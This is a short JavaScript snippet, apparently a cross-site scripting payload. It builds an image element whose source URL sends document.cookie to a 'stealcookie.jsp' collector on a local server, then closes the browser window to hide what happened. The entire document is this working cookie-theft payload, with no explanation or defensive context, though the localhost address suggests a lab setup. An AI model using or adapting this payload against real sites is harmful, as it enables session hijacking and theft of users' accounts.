var el = document.createElement('img');
el.setAttribute('src', 'http://localhost:8080/ct/stealcookie.jsp?c=' + document.cookie);
document.body.appendChild(el);

window.open('', '_self', ''); window.close();